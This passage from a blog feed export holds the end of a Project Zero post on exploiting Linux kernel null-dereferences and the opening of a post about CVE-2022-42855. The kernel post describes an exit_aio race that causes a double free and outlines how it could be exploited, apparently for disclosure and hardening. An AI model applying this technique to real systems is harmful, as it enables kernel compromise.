 <p class="EakHiGVfAD-c4"><span class="EakHiGVfAD-c7">&nbsp; &nbsp; &nbsp; &nbsp; atomic_set</span><span class="EakHiGVfAD-c0">(&amp;</span><span class="EakHiGVfAD-c7">wait</span><span class="EakHiGVfAD-c0">.</span><span class="EakHiGVfAD-c7">count</span><span class="EakHiGVfAD-c0">,</span><span class="EakHiGVfAD-c7">&nbsp;table</span><span class="EakHiGVfAD-c0">-&gt;</span><span class="EakHiGVfAD-c7">nr</span><span class="EakHiGVfAD-c0">);</span></p>
 <p class="EakHiGVfAD-c4"><span class="EakHiGVfAD-c7">&nbsp; &nbsp; &nbsp; &nbsp; init_completion</span><span class="EakHiGVfAD-c0">(&amp;</span><span class="EakHiGVfAD-c7">wait</span><span class="EakHiGVfAD-c0">.</span><span class="EakHiGVfAD-c7">comp</span><span class="EakHiGVfAD-c0">);</span></p>
 <p class="EakHiGVfAD-c4 EakHiGVfAD-c6"><span class="EakHiGVfAD-c2"></span></p>
 <p class="EakHiGVfAD-c4"><span class="EakHiGVfAD-c7">&nbsp; &nbsp; &nbsp; &nbsp; skipped </span><span class="EakHiGVfAD-c0">=</span><span class="EakHiGVfAD-c7">&nbsp;</span><span class="EakHiGVfAD-c9">0</span><span class="EakHiGVfAD-c0">;</span></p>
 <p class="EakHiGVfAD-c4"><span class="EakHiGVfAD-c7">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="EakHiGVfAD-c1">for</span><span class="EakHiGVfAD-c7">&nbsp;</span><span class="EakHiGVfAD-c0">(</span><span class="EakHiGVfAD-c7">i </span><span class="EakHiGVfAD-c0">=</span><span class="EakHiGVfAD-c7">&nbsp;</span><span class="EakHiGVfAD-c9">0</span><span class="EakHiGVfAD-c0">;</span><span class="EakHiGVfAD-c7">&nbsp;i </span><span class="EakHiGVfAD-c0">&lt;</span><span class="EakHiGVfAD-c7">&nbsp;table</span><span class="EakHiGVfAD-c0">-&gt;</span><span class="EakHiGVfAD-c7">nr</span><span class="EakHiGVfAD-c0">;</span><span class="EakHiGVfAD-c7">&nbsp;</span><span class="EakHiGVfAD-c0">++</span><span class="EakHiGVfAD-c7">i</span><span class="EakHiGVfAD-c0">)</span><span class="EakHiGVfAD-c7">&nbsp;</span><span class="EakHiGVfAD-c0">{</span></p>
 <p class="EakHiGVfAD-c4"><span class="EakHiGVfAD-c7">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="EakHiGVfAD-c1">struct</span><span class="EakHiGVfAD-c7">&nbsp;kioctx </span><span class="EakHiGVfAD-c0">*</span><span class="EakHiGVfAD-c7">ctx </span><span class="EakHiGVfAD-c0">=</span></p>
 <p class="EakHiGVfAD-c4"><span class="EakHiGVfAD-c7">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; rcu_dereference_protected</span><span class="EakHiGVfAD-c0">(</span><span class="EakHiGVfAD-c7">table</span><span class="EakHiGVfAD-c0">-&gt;</span><span class="EakHiGVfAD-c7">table</span><span class="EakHiGVfAD-c0">[</span><span class="EakHiGVfAD-c7">i</span><span class="EakHiGVfAD-c0">],</span><span class="EakHiGVfAD-c7">&nbsp;</span><span class="EakHiGVfAD-c1">true</span><span class="EakHiGVfAD-c0">);</span></p>
 <p class="EakHiGVfAD-c4 EakHiGVfAD-c6"><span class="EakHiGVfAD-c2"></span></p>
 <p class="EakHiGVfAD-c4"><span class="EakHiGVfAD-c7">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="EakHiGVfAD-c1">if</span><span class="EakHiGVfAD-c7">&nbsp;</span><span class="EakHiGVfAD-c0">(!</span><span class="EakHiGVfAD-c7">ctx</span><span class="EakHiGVfAD-c0">)</span><span class="EakHiGVfAD-c7">&nbsp;</span><span class="EakHiGVfAD-c0">{</span></p>
 <p class="EakHiGVfAD-c4"><span class="EakHiGVfAD-c7">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; skipped</span><span class="EakHiGVfAD-c0">++;</span></p>
 <p class="EakHiGVfAD-c4"><span class="EakHiGVfAD-c7">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="EakHiGVfAD-c1">continue</span><span class="EakHiGVfAD-c0">;</span></p>
 <p class="EakHiGVfAD-c4"><span class="EakHiGVfAD-c7">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="EakHiGVfAD-c0">}</span></p>
 <p class="EakHiGVfAD-c4"><span class="EakHiGVfAD-c7">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ctx</span><span class="EakHiGVfAD-c0">-&gt;</span><span class="EakHiGVfAD-c7">mmap_size </span><span class="EakHiGVfAD-c0">=</span><span class="EakHiGVfAD-c7">&nbsp;</span><span class="EakHiGVfAD-c9">0</span><span class="EakHiGVfAD-c0">;</span></p>
 <p class="EakHiGVfAD-c4"><span class="EakHiGVfAD-c7">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; kill_ioctx</span><span class="EakHiGVfAD-c0">(</span><span class="EakHiGVfAD-c7">mm</span><span class="EakHiGVfAD-c0">,</span><span class="EakHiGVfAD-c7">&nbsp;ctx</span><span class="EakHiGVfAD-c0">,</span><span class="EakHiGVfAD-c7">&nbsp;</span><span class="EakHiGVfAD-c0">&amp;</span><span class="EakHiGVfAD-c7">wait</span><span class="EakHiGVfAD-c0">);</span></p>
 <p class="EakHiGVfAD-c4"><span class="EakHiGVfAD-c7">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="EakHiGVfAD-c0">}</span></p>
 <p class="EakHiGVfAD-c4 EakHiGVfAD-c6"><span class="EakHiGVfAD-c2"></span></p>
 <p class="EakHiGVfAD-c4"><span class="EakHiGVfAD-c7">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="EakHiGVfAD-c1">if</span><span class="EakHiGVfAD-c7">&nbsp;</span><span class="EakHiGVfAD-c0">(!</span><span class="EakHiGVfAD-c7">atomic_sub_and_test</span><span class="EakHiGVfAD-c0">(</span><span class="EakHiGVfAD-c7">skipped</span><span class="EakHiGVfAD-c0">,</span><span class="EakHiGVfAD-c7">&nbsp;</span><span class="EakHiGVfAD-c0">&amp;</span><span class="EakHiGVfAD-c7">wait</span><span class="EakHiGVfAD-c0">.</span><span class="EakHiGVfAD-c7">count</span><span class="EakHiGVfAD-c0">))</span><span class="EakHiGVfAD-c7">&nbsp;</span><span class="EakHiGVfAD-c0">{</span></p>
 <p class="EakHiGVfAD-c4"><span class="EakHiGVfAD-c7">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="EakHiGVfAD-c13">/* Wait until all IO for the context are done. */</span></p>
 <p class="EakHiGVfAD-c4"><span class="EakHiGVfAD-c7">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; wait_for_completion</span><span class="EakHiGVfAD-c0">(&amp;</span><span class="EakHiGVfAD-c7">wait</span><span class="EakHiGVfAD-c0">.</span><span class="EakHiGVfAD-c7">comp</span><span class="EakHiGVfAD-c0">);</span></p>
 <p class="EakHiGVfAD-c4"><span class="EakHiGVfAD-c7">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="EakHiGVfAD-c0">}</span></p>
 <p class="EakHiGVfAD-c4 EakHiGVfAD-c6"><span class="EakHiGVfAD-c2"></span></p>
 <p class="EakHiGVfAD-c4"><span class="EakHiGVfAD-c7">&nbsp; &nbsp; &nbsp; &nbsp; RCU_INIT_POINTER</span><span class="EakHiGVfAD-c0">(</span><span class="EakHiGVfAD-c7">mm</span><span class="EakHiGVfAD-c0">-&gt;</span><span class="EakHiGVfAD-c7">ioctx_table</span><span class="EakHiGVfAD-c0">,</span><span class="EakHiGVfAD-c7">&nbsp;NULL</span><span class="EakHiGVfAD-c0">);</span></p>
 <p class="EakHiGVfAD-c4"><span class="EakHiGVfAD-c7">&nbsp; &nbsp; &nbsp; &nbsp; kfree</span><span class="EakHiGVfAD-c0">(</span><span class="EakHiGVfAD-c7">table</span><span class="EakHiGVfAD-c0">);</span></p>
 <p class="EakHiGVfAD-c4"><span class="EakHiGVfAD-c0">}</span></p></td></tr></table>
 <p class="EakHiGVfAD-c4 EakHiGVfAD-c6 EakHiGVfAD-c8"><span class="EakHiGVfAD-c5"></span></p>
 <p class="EakHiGVfAD-c4 EakHiGVfAD-c8"><span>While the callee function </span><span class="EakHiGVfAD-c3">kill_ioctx</span><span>&nbsp;is written in such a way to prevent concurrent execution from causing memory corruption (part of the contract of </span><span class="EakHiGVfAD-c22"><a class="EakHiGVfAD-c101" href="https://man7.org/linux/man-pages/man7/aio.7.html">aio</a></span><span>&nbsp;allows for </span><span class="EakHiGVfAD-c3">kill_ioctx</span><span>&nbsp;to be called in a concurrent way), </span><span class="EakHiGVfAD-c3">exit_aio</span><span>&nbsp;itself makes no such guarantees. Two concurrent calls of </span><span class="EakHiGVfAD-c3">exit_aio</span><span>&nbsp;on the same </span><span class="EakHiGVfAD-c3">mm</span><span>&nbsp;</span><span class="EakHiGVfAD-c3">struct</span><span>&nbsp;can consequently</span><span>&nbsp;</span><span>induce</span><span>&nbsp;a double free of the </span><span class="EakHiGVfAD-c3">mm-&gt;ioctx_table</span><span>&nbsp;object, which is fetched at the beginning of the function, while only being freed at the very end. This race window can be widened substantially by creating many </span><span>aio</span><span>&nbsp;contexts in order to slow down </span><span class="EakHiGVfAD-c3">exit_aio&rsquo;s</span><span>&nbsp;internal context freeing loop. Successful exploitation will trigger the following kernel </span><span class="EakHiGVfAD-c3">BUG</span><span class="EakHiGVfAD-c5">&nbsp;indicating that a double free has occurred:</span></p>
 <p class="EakHiGVfAD-c4 EakHiGVfAD-c8 EakHiGVfAD-c6"><span class="EakHiGVfAD-c5"></span></p>
 <p class="EakHiGVfAD-c4 EakHiGVfAD-c8"></p>
 <p class="EakHiGVfAD-c4 EakHiGVfAD-c8"><span><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiyX2lmxdi_963UE1t88A8xenzG7zPNT8Ou2Hvspij4S2FIc_L-y1NsdEy5obGxFNaG3W8X0TpL1TubA64elOjSkJ8FAgPrrDp5B9e1dYtRiM53tlGD1eT8m_2Md9GFS_Hoye-VdLvpZfkII_Qh4eKYSaVDefbE4ttCmgrF-Hkft2ILgW2dTdcIUxgG/s1437/image2.png" style="display: block; padding: 1em 0;text-align: center;"><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiyX2lmxdi_963UE1t88A8xenzG7zPNT8Ou2Hvspij4S2FIc_L-y1NsdEy5obGxFNaG3W8X0TpL1TubA64elOjSkJ8FAgPrrDp5B9e1dYtRiM53tlGD1eT8m_2Md9GFS_Hoye-VdLvpZfkII_Qh4eKYSaVDefbE4ttCmgrF-Hkft2ILgW2dTdcIUxgG/s1200/image2.png" border="0" alt="Kernel backtrace showing the double free condition detection" style="max-height: 750px; max-width: 600px;"title="Kernel backtrace showing the double free condition detection" /></a></span></p>
 <p class="EakHiGVfAD-c4 EakHiGVfAD-c8 EakHiGVfAD-c6"><span class="EakHiGVfAD-c19"></span></p>
 <p class="EakHiGVfAD-c4 EakHiGVfAD-c8"><span>Note that as this </span><span class="EakHiGVfAD-c3">exit_aio</span><span>&nbsp;path is hit from </span><span class="EakHiGVfAD-c3">__mmput</span><span>, triggering this race will produce at least two permanently deadlocked processes when those processes later try to take the mmap write lock. However, from an exploitation perspective, this is irrelevant as the memory corruption primitive has already occurred before the deadlock occurs. Exploiting the resultant primitive would probably involve racing a reclaiming allocation in between the two frees of the </span><span class="EakHiGVfAD-c3">mm-&gt;ioctx_table</span><span>&nbsp;object, then taking advantage of the resulting UAF condition of the reclaimed allocation. It is </span><span>undoubtedly</span><span class="EakHiGVfAD-c5">&nbsp;possible, although I didn&rsquo;t take this all the way to a completed PoC.</span></p><h2 class="EakHiGVfAD-c17 EakHiGVfAD-c8" id="h.hesv56ci2m4m"><span class="EakHiGVfAD-c12">Conclusion</span></h2>
 <p class="EakHiGVfAD-c4 EakHiGVfAD-c8"><span>While the null-dereference bug itself was </span><span class="EakHiGVfAD-c22"><a class="EakHiGVfAD-c101" href="https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/commit/fs/proc/task_mmu.c?h=v5.15.86&id=33fc9e26b7cb39f0d4219c875a2451802249c225">fixed in October 2022</a></span><span>, the more important fix was the </span><span class="EakHiGVfAD-c22"><a class="EakHiGVfAD-c101" href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?h=v6.2-rc3&id=48ea09cddae0b794cde2070f106ef676703dbcd3">introduction of an oops limit</a></span><span>&nbsp;which causes the kernel to panic if too many oopses occur. While this patch is already upstream, it is </span><span>important</span><span>&nbsp;that distributed kernels also inherit this oops limit and backport it to LTS releases if we want to avoid treating such null-dereference bugs as full-fledged security issues in the future. Even in that best-case scenario, it is nevertheless highly beneficial for security researchers to carefully evaluate the side-effects of bugs discovered in the future that are similarly &ldquo;harmless&rdquo; and ensure that the </span><span>abrupt</span><span>&nbsp;halt of kernel code execution caused by a kernel oops does not lead to other security-relevant primitives.</span></p>
## link
## -
## @rel
replies
## @type
application/atom+xml
## @href
https://googleprojectzero.blogspot.com/feeds/6288849578901159797/comments/default
## @title
Post Comments
## -
## @rel
replies
## @type
text/html
## @href
https://googleprojectzero.blogspot.com/2023/01/exploiting-null-dereferences-in-linux.html#comment-form
## @title
0 Comments
## -
## @rel
edit
## @type
application/atom+xml
## @href
https://www.blogger.com/feeds/4838136820032157985/posts/default/6288849578901159797
## -
## @rel
self
## @type
application/atom+xml
## @href
https://www.blogger.com/feeds/4838136820032157985/posts/default/6288849578901159797
## -
## @rel
alternate
## @type
text/html
## @href
https://googleprojectzero.blogspot.com/2023/01/exploiting-null-dereferences-in-linux.html
## @title
Exploiting null-dereferences in the Linux kernel
## author
## name
Google Project Zero
## uri
http://www.blogger.com/profile/08975904405228580347
## email
noreply@blogger.com
## gd:image
## @rel
http://schemas.google.com/g/2005#thumbnail
## @width
16
## @height
16
## @src
https://img1.blogblog.com/img/b16-rounded.gif
## media:thumbnail
## @xmlns:media
http://search.yahoo.com/mrss/
## @url
https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjW-7Gf0dWd5QJfxXYwRAdtMX7uoynsldEgf9C7saF7MLL_iwIUVaagMyOAa8r-e4_KDf33viQn5U2w1LirUQnx7Vk1fJgpACWUijAl8Pgtiu8ZrDTaiEzJYSo3pJUX_nh4Mh4EQ2GPclwSCHcA-OmGfexegm4WykTZyKnIq9ktGTiLcCJo0QW0VKx6/s72-c/image1.png
## @height
72
## @width
72
## thr:total
0
## -
## id
tag:blogger.com,1999:blog-4838136820032157985.post-3562308922263769538
## published
12/01/2023 13:59:00
## updated
12/01/2023 13:59:29
## title
## @type
text
## #text
DER Entitlements: The (Brief) Return of the Psychic Paper
## content
## @type
html
## #text
<style type="text/css">@import url('https://themes.googleusercontent.com/fonts/css?kit=pYEwJuzr3ZMDX2Y1syVbvx06if6osnyAslCuLPPf50A');ul.lst-kix_h97ui6n3g8c8-4{list-style-type:none}ul.lst-kix_h97ui6n3g8c8-5{list-style-type:none}ul.lst-kix_h97ui6n3g8c8-2{list-style-type:none}ul.lst-kix_h97ui6n3g8c8-3{list-style-type:none}ul.lst-kix_h97ui6n3g8c8-8{list-style-type:none}ul.lst-kix_h97ui6n3g8c8-6{list-style-type:none}.lst-kix_o4b5kflpgafe-7>li:before{content:"-  "}ul.lst-kix_h97ui6n3g8c8-7{list-style-type:none}ul.lst-kix_5nbkgo2blvl3-0{list-style-type:none}ul.lst-kix_5nbkgo2blvl3-1{list-style-type:none}ul.lst-kix_h97ui6n3g8c8-0{list-style-type:none}ul.lst-kix_5nbkgo2blvl3-4{list-style-type:none}.lst-kix_o4b5kflpgafe-8>li:before{content:"-  "}ul.lst-kix_h97ui6n3g8c8-1{list-style-type:none}ul.lst-kix_5nbkgo2blvl3-5{list-style-type:none}ul.lst-kix_5nbkgo2blvl3-2{list-style-type:none}ul.lst-kix_5nbkgo2blvl3-3{list-style-type:none}.lst-kix_c2aw6txn2xw5-8>li:before{content:"\0025a0  "}ul.lst-kix_5nbkgo2blvl3-8{list-style-type:none}ul.lst-kix_5nbkgo2blvl3-6{list-style-type:none}ul.lst-kix_5nbkgo2blvl3-7{list-style-type:none}.lst-kix_c2aw6txn2xw5-7>li:before{content:"\0025cb  "}.lst-kix_c2aw6txn2xw5-0>li:before{content:"\0025cf  "}.lst-kix_c2aw6txn2xw5-3>li:before{content:"\0025cf  "}.lst-kix_n26z3gtxgors-6>li:before{content:"\0025cf  "}.lst-kix_c2aw6txn2xw5-4>li:before{content:"\0025cb  "}.lst-kix_n26z3gtxgors-5>li:before{content:"\0025a0  "}.lst-kix_c2aw6txn2xw5-6>li:before{content:"\0025cf  "}.lst-kix_o4b5kflpgafe-0>li:before{content:"-  "}.lst-kix_c2aw6txn2xw5-5>li:before{content:"\0025a0  "}.lst-kix_o4b5kflpgafe-1>li:before{content:"-  "}.lst-kix_n26z3gtxgors-4>li:before{content:"\0025cb  "}.lst-kix_o4b5kflpgafe-2>li:before{content:"-  "}.lst-kix_n26z3gtxgors-1>li:before{content:"\0025cb  "}.lst-kix_n26z3gtxgors-3>li:before{content:"\0025cf  "}.lst-kix_o4b5kflpgafe-3>li:before{content:"-  "}.lst-kix_n26z3gtxgors-2>li:before{content:"\0025a0  "}.lst-kix_o4b5kflpgafe-6>li:before{content:"-  "}.lst-kix_pb72mncojys1-8>li:before{content:"\0025a0  "}.lst-kix_c2aw6txn2xw5-2>li:before{content:"\0025a0  "}.lst-kix_pb72mncojys1-7>li:before{content:"\0025cb  "}.lst-kix_o4b5kflpgafe-4>li:before{content:"-  "}.lst-kix_c2aw6txn2xw5-1>li:before{content:"\0025cb  "}.lst-kix_o4b5kflpgafe-5>li:before{content:"-  "}.lst-kix_n26z3gtxgors-0>li:before{content:"\0025cf  "}.lst-kix_pb72mncojys1-6>li:before{content:"\0025cf  "}.lst-kix_pb72mncojys1-4>li:before{content:"\0025cb  "}.lst-kix_pb72mncojys1-5>li:before{content:"\0025a0  "}.lst-kix_pb72mncojys1-2>li:before{content:"\0025a0  "}.lst-kix_pb72mncojys1-3>li:before{content:"\0025cf  "}.lst-kix_pb72mncojys1-1>li:before{content:"\0025cb  "}.lst-kix_pb72mncojys1-0>li:before{content:"\0025cf  "}ul.lst-kix_n26z3gtxgors-5{list-style-type:none}.lst-kix_mk2jd2ji027g-8>li:before{content:"\0025a0  "}ul.lst-kix_n26z3gtxgors-4{list-style-type:none}ul.lst-kix_n26z3gtxgors-7{list-style-type:none}ul.lst-kix_n26z3gtxgors-6{list-style-type:none}ul.lst-kix_n26z3gtxgors-1{list-style-type:none}ul.lst-kix_n26z3gtxgors-0{list-style-type:none}ul.lst-kix_n26z3gtxgors-3{list-style-type:none}.lst-kix_mk2jd2ji027g-7>li:before{content:"\0025cb  "}ul.lst-kix_n26z3gtxgors-2{list-style-type:none}.lst-kix_mk2jd2ji027g-4>li:before{content:"\0025cb  "}.lst-kix_mk2jd2ji027g-6>li:before{content:"\0025cf  "}.lst-kix_mk2jd2ji027g-5>li:before{content:"\0025a0  "}ul.lst-kix_n26z3gtxgors-8{list-style-type:none}.lst-kix_h97ui6n3g8c8-8>li:before{content:"\0025a0  "}.lst-kix_h97ui6n3g8c8-7>li:before{content:"\0025cb  "}ul.lst-kix_o4b5kflpgafe-4{list-style-type:none}ul.lst-kix_o4b5kflpgafe-3{list-style-type:none}ul.lst-kix_o4b5kflpgafe-2{list-style-type:none}.lst-kix_h97ui6n3g8c8-4>li:before{content:"\0025cb  "}.lst-kix_h97ui6n3g8c8-6>li:before{content:"\0025cf  "}ul.lst-kix_o4b5kflpgafe-1{list-style-type:none}ul.lst-kix_o4b5kflpgafe-8{list-style-type:none}ul.lst-kix_o4b5kflpgafe-7{list-style-type:none}ul.lst-kix_o4b5kflpgafe-6{list-style-type:none}.lst-kix_h97ui6n3g8c8-5>li:before{content:"\0025a0  "}ul.lst-kix_o4b5kflpgafe-5{list-style-type:none}.lst-kix_mk2jd2ji027g-0>li:before{content:"\0025cf  "}.lst-kix_h97ui6n3g8c8-0>li:before{content:"\0025cf  "}.lst-kix_h97ui6n3g8c8-2>li:before{content:"\0025a0  "}ul.lst-kix_o4b5kflpgafe-0{list-style-type:none}.lst-kix_mk2jd2ji027g-3>li:before{content:"\0025cf  "}.lst-kix_h97ui6n3g8c8-3>li:before{content:"\0025cf  "}.lst-kix_mk2jd2ji027g-2>li:before{content:"\0025a0  "}.lst-kix_mk2jd2ji027g-1>li:before{content:"\0025cb  "}.lst-kix_h97ui6n3g8c8-1>li:before{content:"\0025cb  "}.lst-kix_5nbkgo2blvl3-5>li:before{content:"-  "}ul.lst-kix_pb72mncojys1-5{list-style-type:none}ul.lst-kix_pb72mncojys1-4{list-style-type:none}.lst-kix_5nbkgo2blvl3-6>li:before{content:"-  "}.lst-kix_5nbkgo2blvl3-7>li:before{content:"-  "}ul.lst-kix_pb72mncojys1-3{list-style-type:none}ul.lst-kix_pb72mncojys1-2{list-style-type:none}ul.lst-kix_pb72mncojys1-8{list-style-type:none}.lst-kix_5nbkgo2blvl3-8>li:before{content:"-  "}ul.lst-kix_pb72mncojys1-7{list-style-type:none}ul.lst-kix_pb72mncojys1-6{list-style-type:none}ul.lst-kix_pb72mncojys1-1{list-style-type:none}ul.lst-kix_pb72mncojys1-0{list-style-type:none}ul.lst-kix_mk2jd2ji027g-3{list-style-type:none}ul.lst-kix_c2aw6txn2xw5-2{list-style-type:none}ul.lst-kix_mk2jd2ji027g-2{list-style-type:none}ul.lst-kix_c2aw6txn2xw5-3{list-style-type:none}ul.lst-kix_mk2jd2ji027g-1{list-style-type:none}ul.lst-kix_c2aw6txn2xw5-0{list-style-type:none}ul.lst-kix_mk2jd2ji027g-0{list-style-type:none}ul.lst-kix_c2aw6txn2xw5-1{list-style-type:none}ul.lst-kix_mk2jd2ji027g-7{list-style-type:none}ul.lst-kix_mk2jd2ji027g-6{list-style-type:none}ul.lst-kix_mk2jd2ji027g-5{list-style-type:none}ul.lst-kix_mk2jd2ji027g-4{list-style-type:none}ul.lst-kix_mk2jd2ji027g-8{list-style-type:none}.lst-kix_5nbkgo2blvl3-4>li:before{content:"-  "}.lst-kix_5nbkgo2blvl3-2>li:before{content:"-  "}.lst-kix_5nbkgo2blvl3-3>li:before{content:"-  "}.lst-kix_n26z3gtxgors-7>li:before{content:"\0025cb  "}.lst-kix_5nbkgo2blvl3-1>li:before{content:"-  "}.lst-kix_n26z3gtxgors-8>li:before{content:"\0025a0  "}.lst-kix_5nbkgo2blvl3-0>li:before{content:"-  "}li.li-bullet-0:before{margin-left:-18pt;white-space:nowrap;display:inline-block;min-width:18pt}ul.lst-kix_c2aw6txn2xw5-6{list-style-type:none}ul.lst-kix_c2aw6txn2xw5-7{list-style-type:none}ul.lst-kix_c2aw6txn2xw5-4{list-style-type:none}ul.lst-kix_c2aw6txn2xw5-5{list-style-type:none}ul.lst-kix_c2aw6txn2xw5-8{list-style-type:none}ol{margin:0;padding:0}table td,table th{padding:0}.wUhACgDjbS-c33{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#e0e0e0;border-top-width:1pt;border-right-width:1pt;border-left-color:#e0e0e0;vertical-align:top;border-right-color:#e0e0e0;border-left-width:1pt;border-top-style:solid;background-color:#fafafa;border-left-style:solid;border-bottom-width:1pt;width:468pt;border-top-color:#e0e0e0;border-bottom-style:solid}.wUhACgDjbS-c36{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#e0e0e0;border-top-width:1pt;border-right-width:1pt;border-left-color:#e0e0e0;vertical-align:top;border-right-color:#e0e0e0;border-left-width:1pt;border-top-style:solid;background-color:#fafafa;border-left-style:solid;border-bottom-width:1pt;width:471pt;border-top-color:#e0e0e0;border-bottom-style:solid}.wUhACgDjbS-c9{padding-top:18pt;padding-bottom:6pt;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.wUhACgDjbS-c6{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Arial";font-style:normal}.wUhACgDjbS-c20{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:center}.wUhACgDjbS-c1{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left}.wUhACgDjbS-c7{padding-top:0pt;padding-bottom:0pt;line-height:1.5;text-align:left;height:11pt}.wUhACgDjbS-c10{padding-top:0pt;padding-bottom:0pt;line-height:1.5;text-align:left}.wUhACgDjbS-c0{font-size:10pt;font-family:Consolas,"Courier New";color:#616161;font-weight:400}.wUhACgDjbS-c3{font-size:10pt;font-family:Consolas,"Courier New";color:#0f9d58;font-weight:400}.wUhACgDjbS-c16{border-spacing:0;border-collapse:collapse;margin-right:auto}.wUhACgDjbS-c35{margin-left:-3pt;border-spacing:0;border-collapse:collapse;margin-right:auto}.wUhACgDjbS-c15{text-decoration-skip-ink:none;-webkit-text-decoration-skip:none;color:#1155cc;text-decoration:underline}.wUhACgDjbS-c11{color:#000000;text-decoration:none;vertical-align:baseline;font-style:normal}.wUhACgDjbS-c31{font-weight:400;text-decoration:none;vertical-align:baseline;font-family:"Arial"}.wUhACgDjbS-c26{background-color:#ffffff;max-width:468pt;padding:72pt 72pt 72pt 72pt}.wUhACgDjbS-c32{font-size:10pt;font-family:"Roboto";font-weight:400}.wUhACgDjbS-c21{font-weight:400;font-size:16pt;font-family:"Arial"}.wUhACgDjbS-c22{text-decoration:none;vertical-align:baseline;font-style:normal}.wUhACgDjbS-c5{font-size:10pt;font-family:Consolas,"Courier New";font-weight:400}.wUhACgDjbS-c25{padding:0;margin:0}.wUhACgDjbS-c23{font-weight:400;font-family:Consolas,"Courier New"}.wUhACgDjbS-c34{font-weight:700;font-family:"Arial"}.wUhACgDjbS-c18{color:inherit;text-decoration:inherit}.wUhACgDjbS-c4{font-weight:400;font-family:"Courier New"}.wUhACgDjbS-c19{margin-left:36pt;padding-left:0pt}.wUhACgDjbS-c2{margin-left:36pt;height:11pt}.wUhACgDjbS-c12{height:11pt}.wUhACgDjbS-c24{color:#c53929}.wUhACgDjbS-c8{color:#3367d6}.wUhACgDjbS-c28{color:#455a64}.wUhACgDjbS-c13{color:#000000}.wUhACgDjbS-c17{color:#9c27b0}.wUhACgDjbS-c29{font-style:italic}.wUhACgDjbS-c30{font-size:11pt}.wUhACgDjbS-c14{height:0pt}.wUhACgDjbS-c27{color:#990000}.title{padding-top:0pt;color:#000000;font-size:26pt;padding-bottom:3pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.subtitle{padding-top:0pt;color:#666666;font-size:15pt;padding-bottom:16pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}li{color:#000000;font-size:11pt;font-family:"Arial"}p{margin:0;color:#000000;font-size:11pt;font-family:"Arial"}h1{padding-top:20pt;color:#000000;font-size:20pt;padding-bottom:6pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h2{padding-top:18pt;color:#000000;font-size:16pt;padding-bottom:6pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h3{padding-top:16pt;color:#434343;font-size:14pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h4{padding-top:14pt;color:#666666;font-size:12pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h5{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h6{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:left}</style></head><body class="c26 doc-content"><div>
 <p class="wUhACgDjbS-c1 wUhACgDjbS-c12"><span class="wUhACgDjbS-c6"></span></p></div>
 <p class="wUhACgDjbS-c1"><span>Posted by </span><span class="wUhACgDjbS-c6">Ivan Fratric, Project Zero</span></p>
 <p class="wUhACgDjbS-c1 wUhACgDjbS-c12"><span class="wUhACgDjbS-c6"></span></p>
 <p class="wUhACgDjbS-c1"><span class="wUhACgDjbS-c13 wUhACgDjbS-c29 wUhACgDjbS-c30 wUhACgDjbS-c31">Note: The vulnerability discussed here, CVE-2022-42855, was fixed in iOS 15.7.2 and macOS Monterey 12.6.2. While the vulnerability did not appear to be exploitable on iOS 16 and macOS Ventura, iOS 16.2 and macOS Ventura 13.1 nevertheless shipped hardening changes related to it.</span></p>
 <p class="wUhACgDjbS-c1 wUhACgDjbS-c12"><span class="wUhACgDjbS-c6"></span></p>
